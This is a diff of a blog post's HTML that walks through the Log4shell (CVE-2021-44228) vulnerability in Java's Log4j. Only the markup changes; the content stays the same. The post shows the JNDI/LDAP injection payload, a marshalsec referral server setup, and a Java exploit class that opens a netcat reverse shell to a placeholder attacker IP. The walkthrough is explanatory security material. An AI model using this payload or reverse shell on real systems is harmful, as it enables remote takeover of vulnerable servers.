@@ -7,7 +7,7 @@
   <meta http-equiv="content-type" content="text/html; charset=utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <meta name="description" content="Introduction Log4j is a logging framework for Java. A logging framework is better than just printing the logs with a print statement because you don&amp;rsquo;t need to comment the print statements. You just need to maintain a configure file which tells what type of logs to store and write the code with different log levels as:
-logging.ERROR(&amp;quot;error&amp;quot;); logging.WARN(&amp;quot;warning&amp;quot;); Now a logger logs everything. Every interactions with the application along with the time and ip address." />
+logging.ERROR(&amp;#34;error&amp;#34;);logging.WARN(&amp;#34;warning&amp;#34;); Now a logger logs everything. Every interactions with the application along with the time and ip address." />
 <meta name="keywords" content="log4shell, CVE-2021-44228, log4j" />
 <meta name="robots" content="noodp" />
 <link rel="canonical" href="https://somesh-banerjee.github.io/blogs/posts/log4shell/" />
@@ -43,7 +43,7 @@ logging.ERROR(&amp;quot;error&amp;quot;); logging.WARN(&amp;quot;warning&amp;quo
 <meta property="og:type" content="article" />
 <meta property="og:title" content="Log4shell">
 <meta property="og:description" content="Introduction Log4j is a logging framework for Java. A logging framework is better than just printing the logs with a print statement because you don&amp;rsquo;t need to comment the print statements. You just need to maintain a configure file which tells what type of logs to store and write the code with different log levels as:
-logging.ERROR(&amp;quot;error&amp;quot;); logging.WARN(&amp;quot;warning&amp;quot;); Now a logger logs everything. Every interactions with the application along with the time and ip address." />
+logging.ERROR(&amp;#34;error&amp;#34;);logging.WARN(&amp;#34;warning&amp;#34;); Now a logger logs everything. Every interactions with the application along with the time and ip address." />
 <meta property="og:url" content="https://somesh-banerjee.github.io/blogs/posts/log4shell/" />
 <meta property="og:site_name" content="Somesh&#39;s Blog" />
 
@@ -152,12 +152,12 @@ logging.ERROR(&amp;quot;error&amp;quot;); logging.WARN(&amp;quot;warning&amp;quo
   <div class="post-content"><div>
         <h1 id="introduction">Introduction<a href="#introduction" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
 <p>Log4j is a logging framework for Java. A logging framework is better than just printing the logs with a print statement because you don&rsquo;t need to comment the print statements. You just need to maintain a configure file which tells what type of logs to store and write the code with different log levels as:</p>
-<pre><code>logging.ERROR(&quot;error&quot;);
-logging.WARN(&quot;warning&quot;);
+<pre tabindex="0"><code>logging.ERROR(&#34;error&#34;);
+logging.WARN(&#34;warning&#34;);
 </code></pre><p>Now a logger logs everything. Every interactions with the application along with the time and ip address. But the vulnerability in log4j happens when the attacker can craft or manipulate what is logged. Let say it is logging the username and the username is like this</p>
 <p><img src="/blogs/log4j/1.jpg" alt=""></p>
 <p>Now that username is the actual format used for RCE using log4j. The exploit is:</p>
-<pre><code>${jndi:ldap://ATTACKER-SERVER/x}
+<pre tabindex="0"><code>${jndi:ldap://ATTACKER-SERVER/x}
 </code></pre><p>The exploit can be broken into:</p>
 <ol>
 <li>log4j parses the command and sends a ldap request to ATTACKER-SERVER via jndi.</li>
@@ -172,15 +172,15 @@ logging.WARN(&quot;warning&quot;);
 <p>For ldap reference server, we will use <a href="https://github.com/mbechler/marshalsec">marshalsec</a>. It will serve on port 1389 and point to port 8000. Here is the screenshot
 <img src="/blogs/log4j/3.png" alt=""></p>
 <p>Now in port 8000, the compiled class of the following java code is served.
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java"><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Exploit</span> <span style="color:#f92672">{</span>
-    <span style="color:#66d9ef">static</span> <span style="color:#f92672">{</span>
-        <span style="color:#66d9ef">try</span> <span style="color:#f92672">{</span>
-            java<span style="color:#f92672">.</span><span style="color:#a6e22e">lang</span><span style="color:#f92672">.</span><span style="color:#a6e22e">Runtime</span><span style="color:#f92672">.</span><span style="color:#a6e22e">getRuntime</span><span style="color:#f92672">().</span><span style="color:#a6e22e">exec</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;nc -e /bin/bash YOUR.ATTACKER.IP.ADDRESS 9999&#34;</span><span style="color:#f92672">);</span>
-        <span style="color:#f92672">}</span> <span style="color:#66d9ef">catch</span> <span style="color:#f92672">(</span>Exception e<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
-            e<span style="color:#f92672">.</span><span style="color:#a6e22e">printStackTrace</span><span style="color:#f92672">();</span>
-        <span style="color:#f92672">}</span>
-    <span style="color:#f92672">}</span>
-<span style="color:#f92672">}</span></code></pre></div>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Exploit</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">static</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">try</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>            java<span style="color:#f92672">.</span><span style="color:#a6e22e">lang</span><span style="color:#f92672">.</span><span style="color:#a6e22e">Runtime</span><span style="color:#f92672">.</span><span style="color:#a6e22e">getRuntime</span><span style="color:#f92672">().</span><span style="color:#a6e22e">exec</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;nc -e /bin/bash YOUR.ATTACKER.IP.ADDRESS 9999&#34;</span><span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">}</span> <span style="color:#66d9ef">catch</span> <span style="color:#f92672">(</span>Exception e<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>            e<span style="color:#f92672">.</span><span style="color:#a6e22e">printStackTrace</span><span style="color:#f92672">();</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span></span></span></code></pre></div>
 The code just sends a reverse shell to the attacker.</p>
 <p>Now as we are interacting with the victim server using curl and passing the exploit as a parameter, it is getting executed and we are getting the reverse shell from the server.</p>
 <p><img src="/blogs/log4j/4.gif" alt=""></p>
